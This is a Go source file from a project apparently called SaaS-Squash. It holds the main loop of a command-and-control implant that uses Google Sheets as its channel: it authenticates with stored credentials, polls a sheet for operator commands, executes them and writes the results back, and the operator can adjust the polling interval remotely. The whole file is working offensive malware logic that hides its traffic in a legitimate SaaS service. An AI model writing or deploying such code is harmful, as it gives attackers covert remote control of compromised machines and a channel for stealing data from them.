package sheets

import (
	"SaaS-Squash/common"
	"SaaS-Squash/google/authentication"
	"SaaS-Squash/google/configuration"
	"SaaS-Squash/google/utils"
	"time"
)

func Run() error {

	// Perform sheet authentication
	_, clientSheet := authentication.AuthenticateSheet(common.AllC2Configs.Google.Credential)

	// Create new configuration
	spreadSheet := &configuration.SpreadSheet{}
	// Set spreadSheet ID
	spreadSheet.SpreadSheetId = common.AllC2Configs.Google.SheetId

	// Set drive ID
	spreadSheet.DriveId = common.AllC2Configs.Google.DriveId

	// Get new sheet name to create
	newSheetName := utils.GenerateNewSheetName()
	// Set sheet name
	spreadSheet.CommandSheet.Name = newSheetName

	// Set default ticker duration
	spreadSheet.CommandSheet.Ticker = 10

	// Set default range for the ticker configuration
	spreadSheet.CommandSheet.RangeTickerConfiguration = "D1"

	// Creating first command
	command := configuration.Commands{
		RangeIn:  "!A",
		RangeOut: "!B",
		RangeId:  2,
		Input:    "",
		Output:   "",
	}

	// Add command to pool
	spreadSheet.CommandSheet.CommandsExecution = append(spreadSheet.CommandSheet.CommandsExecution, command)

	// Perform drive authentication
	_, clientDrive := authentication.AuthenticateDrive(common.AllC2Configs.Google.Credential)

	// Creating new sheet inside spreadsheet on program start
	createSheet(clientSheet, spreadSheet)

	// Creating ticker
	ticker := time.NewTicker(time.Duration(spreadSheet.CommandSheet.Ticker) * time.Second)

	for {
		select {
		case <-ticker.C:
			go func() {
				// Get last command in the pool
				lastCommand := utils.GetLastCommand(spreadSheet)

				commandToExecute := ""

				// If last command has empty Input we need to get the new command from the spreadsheet
				if lastCommand.Input == "" {
					// Retrieve last command from the sheet
					newTicker := 0
					// command to execute (can be ""), and delay for the ticker
					commandToExecute, newTicker = readSheet(clientSheet, spreadSheet)

					// Update ticker if value has changed
					if newTicker != spreadSheet.CommandSheet.Ticker && newTicker != 0 {
						spreadSheet.CommandSheet.Ticker = newTicker
						common.AllC2Configs.Debug.LogDebug("Updated ticker delay")
						ticker.Reset(time.Duration(spreadSheet.CommandSheet.Ticker) * time.Second)
					}
				}

				// Send status to debug if it's enabled
				if commandToExecute == "" {
					common.AllC2Configs.Debug.LogDebug("Sheets - No new command")
					return
				}

				// Set new retrieved command
				lastCommand.Input = commandToExecute

				// Create new empty command before performing the current one (to avoid deadlock on command execution)
				utils.CreateNewEmptyCommand(spreadSheet)

				// Execute the command
				execute(spreadSheet, clientDrive, lastCommand, commandToExecute)

				// Write result on spreadsheet (result is stored in the current command structure)
				writeSheet(clientSheet, spreadSheet, lastCommand)

			}()
		}
	}

}
